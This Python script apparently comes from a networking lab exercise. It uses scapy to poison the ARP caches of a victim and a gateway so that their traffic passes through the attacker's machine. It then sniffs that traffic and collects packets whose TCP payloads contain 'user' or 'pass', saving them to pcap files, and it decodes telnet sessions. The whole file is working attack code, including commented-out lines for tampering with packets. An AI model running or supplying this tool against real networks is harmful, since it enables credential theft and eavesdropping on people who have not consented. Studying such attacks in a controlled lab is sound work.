from multiprocessing import Process
import multiprocessing
from scapy.all import *

import os
import sys
import time

def get_mac(targetip,interface):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=targetip), iface=interface, timeout=2)
    return ans[0][1][ARP].hwsrc
    
load_layer("http")


class Arper:
    def __init__(self, victim, destination, interface="eth0"):
        #This function initiate the class
        self.victim = victim
        self.victimMAC = 0
        self.dest = destination
        self.destMAC = 0
        self.interface = interface
        self.first100 = []
        self.pktnum = 0
        self.passpkt = []

    def run(self):
        self.victimMAC = get_mac(self.victim,self.interface)
        self.destMAC = get_mac(self.dest,self.interface)
        while True: 
            try:
                self.poison()
                time.sleep(2)
            except KeyboardInterrupt:
                self.restore()

    def poison(self):
        #this function performs the poisoning process
        send(ARP(op=2, pdst=self.victim, hwdst=self.victimMAC, psrc=self.dest), iface=self.interface)
        send(ARP(op=2, pdst=self.dest, hwdst=self.destMAC, psrc=self.victim), iface=self.interface)
       
    
    #wrpcap('sniffed.pcap', packets)
    def sniff(self):
        while True:
 #
            print("Try sniff")
            sniff(iface = self.interface, prn = self.process_packets,count = 0)
        
            print("Stopping")
            wrpcap('Task 2 - Step 2.pcap', self.passpkt)
            quit()

        
     

    def restore(self):
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.victim, hwsrc=self.destMAC, psrc=self.dest), count=5, iface=self.interface)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.dest, hwsrc=self.victimMAC, psrc=self.victim), count=5, iface=self.interface)

    
    def process_packets(self,pkt):
        print("in")

        self.pktnum += 1
        if(self.pktnum < 100):
            self.first100.append(pkt)
        if(self.pktnum == 100):
            print("Saved first 100 packets")
            wrpcap('Task 2 - Step 1.pcap', self.first100)
       
        if TCP in pkt and pkt[TCP].payload:  
            print("Found tcp")
            data = pkt[TCP].payload.load
            print(data)
            if (b"user" in data or b"pass" in data):
                print("Found one!")
                passpkt = str(pkt[TCP].payload) 
                self.passpkt.append(passpkt)
            # print(pkt.payload.layers())fields_desc
            # print("Field Desc",pkt[pkt.payload.layers()[2]].fields_desc)
            if HTTP in pkt:
                print(pkt.show())
                if HTTPResponse in pkt:
                # method = pkt[HTTPResponse].Method.decode()
                    print("Found http response")
                
            ip_src=pkt[IP].src
            ip_dst = pkt[IP].dst
            port=pkt[TCP].sport
            if(port == 23):
                real = (pkt[TCP].payload.load)
                data = real.decode()
                print(data)
                # for i in range(0,len(data)):
                #     if data[i] == 
                # newpkt = pkt[IP]
                # del(newpkt.chksum)
                # del(newpkt[TCP].payload)
                # del(newpkt[TCP].chksum)
                # newpkt = newpkt/stri
                # print("Data transformed from: "+str(real)+" to: "+ stri)
                # send(newpkt, verbose = False)


if __name__ == '__main__':
    
    (victim, destination, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, destination, interface)
    pois_thread = Process(target = myarp.run)
    pois_thread.daemon = True
    pois_thread.start()
   
    myarp.sniff()
    # get_mac(victim,interface)
    # myarp.run()